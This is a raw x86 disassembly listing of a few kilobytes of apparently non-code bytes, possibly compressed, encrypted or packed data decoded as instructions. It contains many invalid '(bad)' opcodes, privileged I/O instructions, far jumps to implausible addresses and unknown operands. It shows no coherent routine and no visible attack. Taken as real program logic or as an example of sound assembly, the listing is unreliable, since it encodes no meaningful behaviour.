  416e03:	xchg   edx,eax
  416e04:	jno    0x416e52
  416e06:	cmp    eax,0xef35a813
  416e0b:	das    
  416e0c:	scas   al,BYTE PTR es:[edi]
  416e0d:	jg     0x416e7a
  416e0f:	inc    esp
  416e10:	jg     0x416e04
  416e12:	(bad)  
  416e13:	aas    
  416e14:	in     al,dx
  416e15:	push   ds
  416e16:	sti    
  416e17:	mov    BYTE PTR [edi-0x40],cl
  416e1a:	adc    ecx,DWORD PTR [esi-0x34]
  416e1d:	in     eax,dx
  416e1e:	ret    
  416e1f:	mov    ah,0x66
  416e21:	jns    0x416e3a
  416e23:	and    ecx,DWORD PTR [edi+0x51]
  416e26:	pop    ss
  416e27:	lahf   
  416e28:	les    ebp,FWORD PTR [edi]
  416e2a:	adc    ebp,DWORD PTR [ebx]
  416e2c:	jne    0x416e04
  416e2e:	push   0x30
  416e30:	sub    ch,BYTE PTR [ebx]
  416e32:	or     eax,0x9eb42ee3
  416e37:	add    al,0xda
  416e39:	and    eax,0x30cb3a17
  416e3e:	mov    cl,0xc3
  416e40:	in     eax,0xbe
  416e42:	add    al,0xec
  416e44:	shl    DWORD PTR [edx+ebp*2+0x5d],1
  416e48:	cmp    bl,BYTE PTR [ecx]
  416e4a:	int3   
  416e4b:	loop   0x416e61
  416e4d:	xor    DWORD PTR [ebp+edx*2-0x2],edi
  416e51:	add    eax,0xef722a81
  416e56:	outs   dx,DWORD PTR ds:[esi]
  416e57:	mov    esp,DWORD PTR [ecx-0x28]
  416e5a:	mov    eax,ds:0xd4ce7ce3
  416e5f:	add    eax,0xd8e009a2
  416e64:	mov    ch,0x7d
  416e66:	jmp    0x2b9743eb
  416e6b:	xor    ebx,DWORD PTR [esi+0x3b]
  416e6e:	push   esi
  416e6f:	mov    ebp,0xc858f7ed
  416e74:	add    BYTE PTR [edx-0x3184e122],al
  416e7a:	das    
  416e7b:	push   ss
  416e7c:	mov    gs,WORD PTR [edi-0x5bb242d8]
  416e82:	std    
  416e83:	mov    ebp,DWORD PTR [bp+di-0x32]
  416e87:	and    ch,al
  416e89:	xor    ebp,edi
  416e8b:	sbb    bh,dh
  416e8d:	jmp    0x761a5976
  416e92:	fidivr DWORD PTR [eax+eax*4+0x8cc863f]
  416e99:	jbe    0x416f15
  416e9b:	pop    eax
  416e9c:	adc    al,0x61
  416e9e:	and    BYTE PTR [eax+ebp*1+0x24],dh
  416ea2:	sub    bl,BYTE PTR [ecx+edi*2+0xab3524b]
  416ea9:	mov    edx,0x8c439869
  416eae:	int3   
  416eaf:	push   ds
  416eb0:	push   ebx
  416eb1:	inc    eax
  416eb2:	imul   eax,edx,0x3c
  416eb5:	mov    ecx,0x938dcb9e
  416eba:	ins    DWORD PTR es:[edi],dx
  416ebb:	add    ebx,DWORD PTR [ecx+0x3d003ef0]
  416ec1:	cld    
  416ec2:	push   ebx
  416ec3:	pop    esi
  416ec4:	sahf   
  416ec5:	stc    
  416ec6:	jmp    0x4d13:0x9e984cd7
  416ecd:	lock pop esp
  416ecf:	out    0x35,eax
  416ed1:	fldcw  WORD PTR [ebx]
  416ed3:	test   eax,0x453e12c
  416ed8:	sub    al,0x34
  416eda:	xchg   edx,eax
  416edb:	pop    ecx
  416edc:	mov    BYTE PTR gs:[ebx-0xb44a9a4],dh
  416ee3:	adc    BYTE PTR [ebp+0x24],0x6
  416ee7:	call   0xfd710cb0
  416eec:	inc    esp
  416eed:	(bad)
  416ef1:	pop    ebx
  416ef2:	in     al,dx
  416ef3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ef4:	mov    eax,ds:0x280398bd
  416ef9:	pushf  
  416efa:	mov    al,ds:0xeda4bb0f
  416eff:	push   ecx
  416f00:	lock lods al,BYTE PTR ds:[esi]
  416f02:	icebp  
  416f03:	xor    eax,0x9cccfddf
  416f08:	test   BYTE PTR [esi],bh
  416f0a:	inc    edx
  416f0b:	retf   0x7e93
  416f0e:	clc    
  416f0f:	test   eax,0xadde4ee3
  416f14:	mov    dl,BYTE PTR [esi+esi*1+0x786ec27]
  416f1b:	sub    BYTE PTR gs:[esi-0x55],dh
  416f1f:	push   ebp
  416f20:	push   ebx
  416f21:	movaps xmm7,xmm5
  416f24:	loopne 0x416f66
  416f26:	outs   dx,BYTE PTR ds:[esi]
  416f27:	hlt    
  416f28:	loope  0x416f83
  416f2a:	cmp    bl,BYTE PTR [ebx+0x48fc404d]
  416f30:	sub    ah,BYTE PTR [ecx]
  416f32:	xchg   esi,eax
  416f33:	sub    BYTE PTR [esi],dh
  416f35:	les    edx,FWORD PTR [ebp-0x334b97a0]
  416f3b:	xor    BYTE PTR ds:0xf358cac8,cl
  416f41:	hlt    
  416f42:	lods   al,BYTE PTR ds:[esi]
  416f43:	mov    eax,0x292530d4
  416f48:	fs enter 0x770c,0x9e
  416f4d:	cwde   
  416f4e:	in     eax,0x26
  416f50:	sub    esp,ecx
  416f52:	xlat   BYTE PTR ds:[ebx]
  416f53:	stos   BYTE PTR es:[edi],al
  416f54:	mov    al,ds:0x7d7380eb
  416f59:	push   cs
  416f5a:	push   ebx
  416f5b:	adc    ecx,edi
  416f5d:	(bad)  
  416f5e:	jle    0x416f40
  416f60:	pop    ebp
  416f61:	jns    0x416f89
  416f63:	xchg   esi,eax
  416f64:	xchg   edi,eax
  416f65:	pop    edi
  416f66:	and    DWORD PTR [ebx],edi
  416f68:	cdq    
  416f69:	xchg   ecx,eax
  416f6a:	das    
  416f6b:	sub    esi,ebx
  416f6d:	push   edx
  416f6e:	cmp    al,0xb3
  416f70:	fwait
  416f71:	loop   0x416f77
  416f73:	add    eax,0xaaeb1e1
  416f78:	aam    0xda
  416f7a:	adc    DWORD PTR [edi],esi
  416f7c:	les    eax,FWORD PTR [edi-0x5f]
  416f7f:	jae    0x416fec
  416f81:	icebp  
  416f82:	call   0xc8c5:0xc9139ca
  416f89:	jmp    0xef414b2d
  416f8e:	pop    edi
  416f8f:	inc    esi
  416f90:	test   eax,0x9877ebc9
  416f95:	jns    0x416f96
  416f97:	sub    DWORD PTR [ecx-0x5443a3d7],ecx
  416f9d:	sahf   
  416f9e:	sbb    DWORD PTR [edx+0x31],0xb50932aa
  416fa5:	jnp    0x416f62
  416fa7:	dec    edx
  416fa8:	int3   
  416fa9:	sbb    DWORD PTR [ebp+0x7a],0xfffffff4
  416fad:	dec    ecx
  416fae:	popf   
  416faf:	call   0xe4f47e0c
  416fb4:	fisttp QWORD PTR [edx+0x2c]
  416fb7:	or     eax,0x730d1ad8
  416fbc:	xlat   BYTE PTR ds:[ebx]
  416fbd:	add    eax,0x4c366ea7
  416fc2:	mov    ebx,0x349d11db
  416fc7:	clc    
  416fc8:	cmp    ecx,DWORD PTR [ecx+esi*1+0x197a2620]
  416fcf:	and    ebx,eax
  416fd1:	out    0x84,al
  416fd3:	pop    es
  416fd4:	gs mov esp,0x9de37aee
  416fda:	pop    edx
  416fdb:	inc    edi
  416fdc:	pop    es
  416fdd:	repnz mov ah,0xb9
  416fe0:	and    ebx,eax
  416fe2:	shl    DWORD PTR [esi+0x455d27a0],1
  416fe8:	add    ch,BYTE PTR [edi+0x754fe15d]
  416fee:	push   ebx
  416fef:	mov    edi,0x1b58a4e0
  416ff4:	pusha  
  416ff5:	in     eax,dx
  416ff6:	mov    edx,0x5afce8de
  416ffb:	jg     0x41703d
  416ffd:	shr    BYTE PTR [ecx],cl
  416fff:	outs   dx,DWORD PTR ds:[esi]
  417000:	repz inc edx
  417002:	shl    DWORD PTR [edi],1
  417004:	loop   0x417036
  417006:	push   0x21e4d976
  41700b:	retf   0xbd64
  41700e:	mov    ebx,0x7375c17d
  417013:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417014:	inc    esi
  417015:	leave  
  417016:	xchg   ebp,eax
  417017:	xchg   esi,eax
  417018:	arpl   WORD PTR [ebx+ecx*1-0x6f],si
  41701c:	xor    dl,BYTE PTR [edx+edx*1-0x1d02ae15]
  417023:	mov    al,ds:0x79be35f3
  417028:	push   ss
  417029:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41702a:	sbb    BYTE PTR [edx+0x3e70859f],bl
  417030:	(bad)  
  417031:	bound  ebx,QWORD PTR [ecx+0x10848a39]
  417037:	inc    esp
  417038:	hlt    
  417039:	pop    edx
  41703a:	ins    DWORD PTR es:[edi],dx
  41703b:	stos   DWORD PTR es:[edi],eax
  41703c:	sbb    esi,ebx
  41703e:	jo     0x41706d
  417040:	adc    BYTE PTR [ebx+0x3d9a1e25],cl
  417046:	sahf   
  417047:	jno    0x416ff8
  417049:	mov    ds:0x204496ba,eax
  41704e:	inc    esp
  41704f:	cmp    al,0xad
  417051:	xor    esp,DWORD PTR [ecx+0x7544a1f4]
  417057:	cmp    edx,ebp
  417059:	mov    cl,0x2c
  41705b:	shl    DWORD PTR [esp+ebp*2+0x7255d239],1
  417062:	mov    bl,0xfc
  417064:	push   ss
  417065:	mov    BYTE PTR [ebx],ch
  417067:	xchg   BYTE PTR ds:0x7427e94d,ah
  41706d:	jl     0x41708e
  41706f:	fild   QWORD PTR [edi]
  417071:	scas   eax,DWORD PTR es:[edi]
  417072:	stc    
  417073:	popf   
  417074:	add    dl,BYTE PTR [ecx+0x6a7736b6]
  41707a:	cmp    DWORD PTR [ebx-0x31b3d51],esp
  417080:	popf   
  417081:	sbb    al,0x8e
  417083:	sub    edi,DWORD PTR [ecx+ecx*8]
  417086:	sub    BYTE PTR [edx],0xa5
  417089:	xchg   esi,eax
  41708a:	and    al,BYTE PTR [eax+edi*1+0x52e4e133]
  417091:	inc    ecx
  417092:	ins    DWORD PTR es:[edi],dx
  417093:	xor    ebx,DWORD PTR [ebp+0x7046435a]
  417099:	aaa    
  41709a:	and    BYTE PTR [eax-0x3e4ae3dd],ch
  4170a0:	rcr    DWORD PTR [ebp+ecx*2+0xc],0x83
  4170a5:	shl    DWORD PTR [esi],cl
  4170a7:	push   ebp
  4170a8:	xchg   ecx,eax
  4170a9:	pop    ds
  4170aa:	scas   eax,DWORD PTR es:[edi]
  4170ab:	(bad)
  4170ae:	div    cl
  4170b0:	xor    eax,DWORD PTR [edx]
  4170b2:	int3   
  4170b3:	addr16 adc dl,bl
  4170b6:	pop    ebp
  4170b7:	jne    0x417136
  4170b9:	cmp    eax,0x5a1037bb
  4170be:	loopne 0x4170b1
  4170c0:	pop    ebx
  4170c1:	cmp    BYTE PTR [edi],al
  4170c3:	jnp    0x417069
  4170c5:	daa    
  4170c6:	rol    ebx,0xbb
  4170c9:	fcomp  QWORD PTR [ebx+eiz*8+0x7f1f49e8]
  4170d0:	mov    edx,0xa7e93333
  4170d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170d6:	mov    bp,WORD PTR [edi-0x56]
  4170da:	jge    0x4170cf
  4170dc:	ss add ebp,edx
  4170df:	pop    ecx
  4170e0:	pop    esp
  4170e1:	sub    eax,0xeb33bf61
  4170e6:	or     ecx,DWORD PTR [ebx+0x10f98efc]
  4170ec:	cmc    
  4170ed:	retf   0x3267
  4170f0:	test   eax,0x338658f3
  4170f5:	jp     0x4170c1
  4170f7:	pop    es
  4170f8:	dec    esi
  4170f9:	push   0xbc9452f3
  4170fe:	dec    ebp
  4170ff:	xor    al,0x2f
  417101:	out    0xf8,eax
  417103:	mov    al,0xb0
  417105:	push   0xffffff90
  417107:	std    
  417108:	dec    esi
  417109:	pushf  
  41710a:	add    dh,BYTE PTR [ecx+0x64de96da]
  417110:	xchg   esp,eax
  417111:	repz int 0xfa
  417114:	into   
  417115:	frndint 
  417117:	xor    BYTE PTR [edx+eiz*2],0x51
  41711b:	mov    cl,0x39
  41711d:	(bad)  
  41711e:	cmc    
  41711f:	push   cs
  417120:	ja     0x417166
  417122:	xchg   ebx,eax
  417123:	lods   al,BYTE PTR ds:[esi]
  417124:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417125:	xor    ebx,DWORD PTR [eax]
  417127:	sbb    DWORD PTR [ebp+0x38ac06b2],ebx
  41712d:	shr    DWORD PTR [eax],1
  41712f:	lods   eax,DWORD PTR ds:[esi]
  417130:	(bad)  
  417131:	(bad)  
  417133:	sahf   
  417134:	push   0xcbb5e4ba
  417139:	outs   dx,BYTE PTR ds:[esi]
  41713a:	aaa    
  41713b:	jmp    0x7813b084
  417140:	dec    edx
  417141:	in     eax,dx
  417142:	mov    ch,0xd
  417144:	(bad)  
  417145:	cld    
  417146:	xchg   esp,eax
  417147:	push   es
  417148:	inc    edi
  417149:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41714a:	ins    DWORD PTR es:[edi],dx
  41714b:	(bad)  [ecx]
  41714d:	in     al,dx
  41714e:	push   ds
  41714f:	retf   0xe60f
  417152:	push   esi
  417153:	pop    ebp
  417154:	push   ebp
  417155:	jle    0x417124
  417157:	adc    esp,DWORD PTR [ecx-0x36]
  41715a:	inc    ecx
  41715b:	adc    eax,0xb07acbee
  417160:	call   0x87ebdb48
  417165:	cdq    
  417166:	push   esp
  417167:	mov    cl,BYTE PTR [ebp-0x41]
  41716a:	and    BYTE PTR ds:0xe3d5e436,ch
  417170:	mov    esp,?
  417172:	mov    ebx,0x98095c46
  417177:	outs   dx,BYTE PTR ds:[esi]
  417178:	pop    esp
  417179:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41717a:	popf   
  41717b:	and    BYTE PTR [eax-0x20],dl
  41717e:	jo     0x417193
  417180:	in     al,0x2b
  417182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417183:	les    ecx,FWORD PTR [ecx-0x76a66e54]
  417189:	adc    bh,BYTE PTR [esi-0x69ccdae7]
  41718f:	xor    ch,BYTE PTR [ecx]
  417191:	mov    ds:0x1a554b96,eax
  417196:	cdq    
  417197:	pmaxsw mm4,mm6
  41719a:	les    ebp,FWORD PTR [ebp-0x16]
  41719d:	add    DWORD PTR [eax-0xb9dc0e],ebp
  4171a3:	aad    0x39
  4171a5:	cwde   
  4171a6:	and    DWORD PTR [eax],0x3b9e0bfb
  4171ac:	ins    BYTE PTR es:[edi],dx
  4171ad:	pop    edi
  4171ae:	addr16 stc 
  4171b0:	dec    ecx
  4171b1:	adc    DWORD PTR [ebx],ebx
  4171b3:	sar    DWORD PTR [eax+ebp*8+0x7a],cl
  4171b7:	pushf  
  4171b8:	inc    ebx
  4171b9:	iret   
  4171ba:	xor    dl,BYTE PTR [esp+ebx*8-0x2a1a952c]
  4171c1:	jge    0x417158
  4171c3:	popa   
  4171c4:	mov    ebp,0x25137f20
  4171c9:	retf   0xf03c
  4171cc:	dec    ebp
  4171cd:	jnp    0x41716d
  4171cf:	iret   
  4171d0:	sbb    eax,0x3489387c
  4171d5:	xchg   esi,eax
  4171d6:	cdq    
  4171d7:	out    dx,eax
  4171d8:	mov    ds:0xd9485a47,al
  4171dd:	call   0x74592673
  4171e2:	lods   eax,DWORD PTR ds:[esi]
  4171e3:	push   ebp
  4171e4:	ret    
  4171e5:	jne    0x4171e2
  4171e7:	pusha  
  4171e8:	pop    ss
  4171e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171ea:	shl    DWORD PTR [edx+ecx*2+0x44],cl
  4171ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171ef:	pop    ecx
  4171f0:	sbb    DWORD PTR cs:[edi],esi
  4171f3:	imul   edx,DWORD PTR [edi-0x7c7aaa2f],0xad81a3c4
  4171fd:	ss ja  0x41721c
  417200:	push   edx
  417201:	adc    DWORD PTR [ebx-0x43],ecx
  417204:	shl    BYTE PTR [edx-0x38],0x79
  417208:	inc    ecx
  417209:	sub    BYTE PTR [ecx+0x2d],ch
  41720c:	jmp    0x417242
  41720e:	and    DWORD PTR [edx+edx*8+0x46],0xffffffb4
  417213:	mov    bl,0xf4
  417215:	mov    bl,0x26
  417217:	ins    BYTE PTR es:[edi],dx
  417218:	dec    edx
  417219:	adc    al,0x18
  41721b:	mov    ds:0x5addb576,al
  417220:	mov    ebp,0x4735a8b2
  417225:	xor    DWORD PTR [edx-0x41],esi
  417228:	fwait
  417229:	mov    ds:0x828b8e96,al
  41722e:	imul   eax,DWORD PTR [esi+0x4b],0x87b2b17a
  417235:	ret    
  417236:	clc    
  417237:	call   0x2df399cd
  41723c:	rcr    ch,1
  41723e:	in     al,dx
  41723f:	iret   
  417240:	dec    esp
  417241:	sub    al,0xc3
  417243:	inc    edx
  417244:	mov    DWORD PTR [ebp+0x1656ed5a],edi
  41724a:	(bad)  
  41724c:	in     al,0x57
  41724e:	jnp    0x417274
  417250:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417251:	outs   dx,BYTE PTR ds:[esi]
  417252:	test   DWORD PTR ds:[edi],esp
  417255:	scas   al,BYTE PTR es:[edi]
  417256:	rol    BYTE PTR [ecx],cl
  417258:	mov    edx,0x27c0dc08
  41725d:	(bad)  
  41725e:	lock out dx,al
  417260:	mov    edi,0x4571f3c3
  417265:	lahf   
  417266:	test   DWORD PTR [ebx+ebx*8+0x70],ebx
  41726a:	add    al,0x2a
  41726c:	leave  
  41726d:	jmp    0x48def4c8
  417272:	pop    ecx
  417273:	mov    edx,0x4f472ad8
  417278:	into   
  417279:	and    dl,BYTE PTR [ebp-0x3f]
  41727c:	cmp    bh,dl
  41727e:	mov    dh,0x30
  417280:	leave  
  417281:	dec    ebx
  417282:	rol    DWORD PTR [ebx+0x78],1
  417285:	stos   DWORD PTR es:[edi],eax
  417286:	add    al,BYTE PTR [esi+0x2e]
  417289:	and    bh,dh
  41728b:	adc    DWORD PTR [edi-0x3c],ecx
  41728e:	jae    0x417234
  417290:	dec    edi
  417291:	or     BYTE PTR [ebp-0x64],ch
  417294:	sub    BYTE PTR [esi-0x58],ch
  417297:	sub    al,0x27
  417299:	mov    dh,BYTE PTR [ebp+ebp*1+0x11]
  41729d:	popa   
  41729e:	icebp  
  41729f:	jne    0x4172af
  4172a1:	sub    al,0xa9
  4172a3:	inc    eax
  4172a4:	cmp    al,0xde
  4172a6:	or     eax,0x6f3274aa
  4172ab:	mov    eax,DWORD PTR ds:0x81078fb6
  4172b1:	mov    dh,0x67
  4172b3:	aam    0x6b
  4172b5:	mov    WORD PTR [eax+ecx*1-0x1b],?
  4172b9:	arpl   WORD PTR es:[esi+0x59],si
  4172bd:	mov    ds:0x455e8c5b,eax
  4172c2:	xor    ah,ah
  4172c4:	dec    BYTE PTR [esi]
  4172c6:	fist   WORD PTR [ebx+eiz*4-0x12cad681]
  4172cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172ce:	pop    ebp
  4172cf:	imul   esp,DWORD PTR [ebp+edi*2+0x1c],0xe29c6b18
  4172d7:	adc    edx,ebx
  4172d9:	push   ss
  4172da:	lock inc edx
  4172dc:	mov    bl,al
  4172de:	mov    eax,ds:0x46ce00c6
  4172e3:	pop    eax
  4172e4:	sub    esp,0xa304f370
  4172ea:	and    BYTE PTR [edi+edi*1+0x2b733743],ah
  4172f1:	and    dl,ch
  4172f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172f4:	xchg   ebx,eax
  4172f5:	sub    al,0x6
  4172f7:	xor    edx,DWORD PTR [edi]
  4172f9:	fidivr DWORD PTR [ecx+edx*2]
  4172fc:	push   0xd0bf6f5a
  417301:	fsubr  QWORD PTR [edx-0x6f93d483]
  417307:	int    0x34
  417309:	sti    
  41730a:	ficomp WORD PTR [esi]
  41730c:	push   cs
  41730d:	inc    ebx
  41730e:	add    BYTE PTR [ecx],ch
  417310:	outs   dx,DWORD PTR ds:[esi]
  417311:	repz push 0xf
  417314:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417315:	fcomp  QWORD PTR [edx]
  417317:	mov    bl,0x8b
  417319:	mov    ds:0x44f5f4ad,al
  41731e:	jge    0x41731a
  417320:	aas    
  417321:	sahf   
  417322:	scas   eax,DWORD PTR es:[edi]
  417323:	or     al,0x77
  417325:	xor    al,BYTE PTR [esi-0x24]
  417328:	push   ebx
  417329:	scas   eax,DWORD PTR es:[edi]
  41732a:	fiadd  DWORD PTR [esp+eiz*4]
  41732d:	jle    0x417339
  41732f:	jecxz  0x417374
  417331:	sar    BYTE PTR [ebp+edi*2+0x21],0xb5
  417336:	data16 mov al,0x12
  417339:	rcr    DWORD PTR [ebx-0x30da96f7],0x36
  417340:	or     ebx,DWORD PTR [ecx]
  417342:	and    cx,dx
  417345:	jge    0x41730c
  417347:	pop    ecx
  417348:	cmp    esp,DWORD PTR [esi+0x42bf6f4c]
  41734e:	cmp    eax,0x7d7d22d0
  417353:	push   esi
  417354:	das    
  417355:	sbb    BYTE PTR [ebp-0x3d25ea4a],dh
  41735b:	cmp    ah,bl
  41735d:	jle    0x417309
  41735f:	arpl   WORD PTR [esi+0x63],si
  417362:	out    dx,eax
  417363:	or     BYTE PTR [edi],dl
  417365:	or     esi,DWORD PTR [esi+0x38064b6e]
  41736b:	and    ebx,edx
  41736d:	sbb    al,0xb3
  41736f:	(bad)  
  417370:	stos   BYTE PTR es:[edi],al
  417371:	add    dh,bl
  417373:	push   es
  417374:	pop    eax
  417375:	cmp    DWORD PTR [esi],ecx
  417377:	add    eax,0x2cf4705b
  41737c:	sbb    ebp,eax
  41737e:	xchg   BYTE PTR [ebx],bl
  417380:	jnp    0x4173f9
  417382:	lds    esp,FWORD PTR [ebx+eax*1+0x7d]
  417386:	adc    al,0x32
  417388:	add    al,0x95
  41738a:	fst    DWORD PTR [esi+ebp*8+0x399c6336]
  417391:	(bad)  
  417392:	not    BYTE PTR [edi+0x550aa5b3]
  417398:	shl    DWORD PTR [ecx+0x4f534997],cl
  41739e:	hlt    
  41739f:	xor    DWORD PTR [edi],ebx
  4173a1:	hlt    
  4173a2:	out    dx,al
  4173a3:	stc    
  4173a4:	dec    esi
  4173a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173a6:	popa   
  4173a7:	imul   esi,DWORD PTR [edi-0x37],0xe3732c5d
  4173ae:	ins    BYTE PTR es:[edi],dx
  4173af:	mov    DWORD PTR [ecx+0x448ec1bd],ebx
  4173b5:	ficomp DWORD PTR [edx+0x3812b2d9]
  4173bb:	nop
  4173bc:	dec    eax
  4173bd:	pop    eax
  4173be:	mov    ebx,0xa663f1a2
  4173c3:	jle    0x417384
  4173c5:	outs   dx,BYTE PTR ds:[esi]
  4173c6:	inc    ebp
  4173c7:	sub    al,0x39
  4173c9:	scas   al,BYTE PTR es:[edi]
  4173ca:	adc    ecx,DWORD PTR [edi]
  4173cc:	aam    0x83
  4173ce:	(bad)  
  4173cf:	icebp  
  4173d0:	(bad)  
  4173d1:	loope  0x41738b
  4173d3:	aad    0x10
  4173d5:	lds    ecx,FWORD PTR [ecx+esi*1-0x48]
  4173d9:	push   esp
  4173da:	mov    al,0xd1
  4173dc:	out    dx,eax
  4173dd:	ins    BYTE PTR es:[edi],dx
  4173de:	xchg   DWORD PTR [esi+0x30],edi
  4173e1:	jge    0x41744c
  4173e3:	lods   eax,DWORD PTR ds:[esi]
  4173e4:	or     eax,eax
  4173e6:	mov    esp,0x6b8065d3
  4173eb:	add    eax,esp
  4173ed:	icebp  
  4173ee:	inc    esp
  4173ef:	jle    0x41742f
  4173f1:	sub    al,0x4a
  4173f3:	repz les ebp,FWORD PTR [eax+0x64cfa20c]
  4173fa:	dec    edx
  4173fb:	and    eax,0x305e3282
  417400:	or     BYTE PTR cs:[ecx+0x796090a4],bh
  417407:	bound  edx,QWORD PTR [ecx-0x5e]
  41740a:	sub    eax,0x42fae411
  41740f:	jb     0x41741b
  417411:	xlat   BYTE PTR ds:[ebx]
  417412:	sahf   
  417413:	sbb    edi,DWORD PTR [ecx]
  417415:	cmp    eax,0xc566bee4
  41741a:	test   al,bl
  41741c:	loop   0x41741c
  41741e:	repz leave 
  417420:	popa   
  417421:	jo     0x41740b
  417423:	clc    
  417424:	into   
  417425:	sub    DWORD PTR [ebx],eax
  417427:	in     eax,dx
  417428:	push   ebp
  417429:	inc    edi
  41742a:	ss dec ecx
  41742c:	mov    WORD PTR [edi+0x5c7976b2],gs
  417432:	mov    ss,WORD PTR ds:[ecx]
  417435:	hlt    
  417436:	or     eax,edi
  417438:	pop    ebp
  417439:	cmc    
  41743a:	sbb    eax,esp
  41743c:	add    al,0x71
  41743e:	leave  
  41743f:	xor    edi,ebp
  417441:	loop   0x4174b4
  417443:	ins    BYTE PTR es:[di],dx
  417445:	xchg   edi,eax
  417446:	out    0xab,eax
  417448:	sub    DWORD PTR [esi],0xebb49d98
  41744e:	xchg   edi,eax
  41744f:	pop    ebx
  417450:	mov    ?,WORD PTR [ebp-0x4b]
  417453:	retf   0xecb6
  417456:	add    ebx,0x57c9875f
  41745c:	push   esp
  41745d:	mov    eax,0xb131d3f3
  417462:	mov    edi,0x1b97becc
  417467:	int    0x76
  417469:	xor    ebx,0xffffffb0
  41746c:	fdivr  DWORD PTR [esi+0x64b237ab]
  417472:	cdq    
  417473:	mov    esp,DWORD PTR ds:0xfa4e324d
  417479:	iret   
  41747a:	dec    ecx
  41747b:	or     al,0x75
  41747d:	cld    
  41747e:	nop
  41747f:	mov    edx,0xa22bdbcc
  417484:	xchg   edi,eax
  417485:	int3   
  417486:	xor    edx,edi
  417488:	push   ecx
  417489:	and    eax,0x1c28d2c6
  41748e:	inc    esp
  41748f:	jecxz  0x4174a1
  417491:	stos   DWORD PTR es:[edi],eax
  417492:	push   ebx
  417493:	dec    eax
  417494:	xchg   BYTE PTR [ebp-0x4e0bc968],dh
  41749a:	or     eax,0x4bedb0d3
  41749f:	pop    ss
  4174a0:	les    eax,FWORD PTR [ebx+0x67f52272]
  4174a6:	push   cs
  4174a7:	add    DWORD PTR [edx+edx*4+0x4c],eax
  4174ab:	mov    bl,0xee
  4174ad:	sub    al,0x5b
  4174af:	mov    ah,cl
  4174b1:	sub    dl,BYTE PTR [edx]
  4174b3:	out    0x37,al
  4174b5:	or     al,BYTE PTR [esi-0x77e2303f]
  4174bb:	sti    
  4174bc:	ja     0x4174ed
  4174be:	mov    al,ds:0xba2100a3
  4174c3:	loope  0x41753d
  4174c5:	mov    ecx,0x9eea4b19
  4174ca:	inc    eax
  4174cb:	sub    ah,ah
  4174cd:	push   esp
  4174ce:	sbb    edi,ebp
  4174d0:	pavgb  mm2,QWORD PTR [ebx]
  4174d3:	iret   
  4174d4:	rcl    DWORD PTR [ebx+0x6e3865ef],cl
  4174da:	icebp  
  4174db:	daa    
  4174dc:	stc    
  4174dd:	cli    
  4174de:	pop    ebp
  4174df:	retf   0x35df
  4174e2:	or     dl,bl
  4174e4:	inc    ebp
  4174e5:	lods   eax,DWORD PTR ds:[esi]
  4174e6:	jmp    0x417542
  4174e8:	icebp  
  4174e9:	popa   
  4174ea:	mul    BYTE PTR [edi+0x1e7e802c]
  4174f0:	imul   eax,ebx,0x2c
  4174f3:	lods   al,BYTE PTR ds:[esi]
  4174f4:	pusha  
  4174f5:	out    dx,ax
  4174f7:	cmp    al,0x8f
  4174f9:	sbb    eax,0x3a81cf80
  4174fe:	xor    ecx,ebx
  417500:	int    0xf1
  417502:	jns    0x417506
  417504:	push   ebx
  417505:	pop    ds
  417506:	imul   eax,DWORD PTR [eax],0x66da00b4
  41750c:	aam    0xb9
  41750e:	and    eax,0xd0bfa9c1
  417513:	leave  
  417514:	sbb    BYTE PTR [ebp-0x248f7833],bh
  41751a:	inc    ecx
  41751b:	in     al,dx
  41751c:	add    ecx,eax
  41751e:	jl     0x4174c1
  417520:	push   esp
  417521:	popa   
  417522:	mov    dl,0xac
  417524:	test   al,0xf1
  417526:	or     bh,BYTE PTR [ebx]
  417528:	ins    BYTE PTR es:[edi],dx
  417529:	call   0x6fe840b5
  41752e:	or     DWORD PTR ds:0xfaf057da,esi
  417534:	jp     0x417568
  417536:	jmp    0x3012:0xdf66d865
  41753d:	fs aaa 
  41753f:	jnp    0x4174d5
  417541:	and    ch,dl
  417543:	es ins DWORD PTR es:[di],dx
  417546:	mov    dh,0x80
  417548:	repnz sub ah,BYTE PTR [eax]
  41754b:	xor    ch,bl
  41754d:	loop   0x417512
  41754f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417550:	xchg   ebp,eax
  417551:	(bad)  
  417552:	in     al,dx
  417553:	mov    ds,WORD PTR [edi+ebp*1]
  417556:	js     0x4175b0
  417558:	imul   ebx,ebx,0x7a
  41755b:	lods   eax,DWORD PTR ds:[esi]
  41755c:	jae    0x417590
  41755e:	xchg   ecx,eax
  41755f:	fisub  WORD PTR [edx-0x55434cc]
  417565:	loope  0x417561
  417567:	pop    ebp
  417568:	imul   esp,DWORD PTR [eax],0x498cc7fd
  41756e:	aaa    
  41756f:	sbb    eax,0x429547e2
  417574:	xor    cl,BYTE PTR [ebp+0x6820680]
  41757a:	pop    ss
  41757b:	je     0x417526
  41757d:	jne    0x4175b3
  41757f:	xchg   esp,eax
  417580:	xor    ebx,ebx
  417582:	mov    BYTE PTR [edx-0x63],cl
  417585:	je     0x41755c
  417587:	loop   0x4175a0
  417589:	scas   al,BYTE PTR es:[edi]
  41758a:	xor    eax,0x31022fab
  41758f:	sbb    cl,dh
  417591:	stos   DWORD PTR es:[edi],eax
  417592:	mov    al,0x81
  417594:	popa   
  417595:	mov    esp,0xa8bb5e22
  41759a:	aaa    
  41759b:	push   cs
  41759c:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41759e:	add    bl,BYTE PTR [edx+eax*4-0x3b]
  4175a2:	xor    BYTE PTR [ecx-0x1d],ch
  4175a5:	test   DWORD PTR [edx+0x5a],0xdfbad789
  4175ac:	(bad)  
  4175ae:	ror    BYTE PTR [eax+0x52],cl
